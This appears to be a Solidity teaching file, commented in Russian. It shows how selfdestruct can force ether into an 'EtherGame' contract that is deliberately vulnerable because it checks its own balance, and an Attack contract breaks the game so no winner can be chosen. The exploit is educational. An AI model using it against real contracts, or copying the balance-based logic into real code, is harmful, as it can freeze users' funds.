// SPDX-License-Identifier: MIT
// compiler version must be greater than or equal to 0.8.20 and less than 0.9.0
pragma solidity ^0.8.23;
// контракты можно удалить из блокчейна
// selfdestruct отправляет весь оставшийся эфир, хранящийся в контракте, в обозначенный адресс
// сделаем игру. цель игры - стать 7-м игроком внесшим депозит в размере 1эфира
// можно внести только 1 эфир за раз
//победитель выводит весь эфир 
/*
1. разворачиваем EtherGame
2. два игрока соглашаются играть и вносят по 1 эфиру
3. разворачиваем атаку с адресом EtherGame
4. вызываем attack отправив 5 эфира, тем самым ломаем игру
Атака приводит к тому что баланс EtherGame сравнялся с 7 эфиром
соответственно никто не может внести депозит, и победитель не может быть определен
*/
contract EtherGame{
    uint public targetAmount = 7 ether;
    address public winner;
    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");
        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }
    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
contract Attack {
    EtherGame etherGame;
    constructor(EtherGame _etherGame){
        etherGame = EtherGame(_etherGame);
    }
    function attack() public payable {
        //ломаем игру, отправив эфир так что бы баланс игры был >= 7 эфира
        // указать адрес к оплате 
        address payable addr = payable (address(etherGame));
        selfdestruct(addr);
    }
}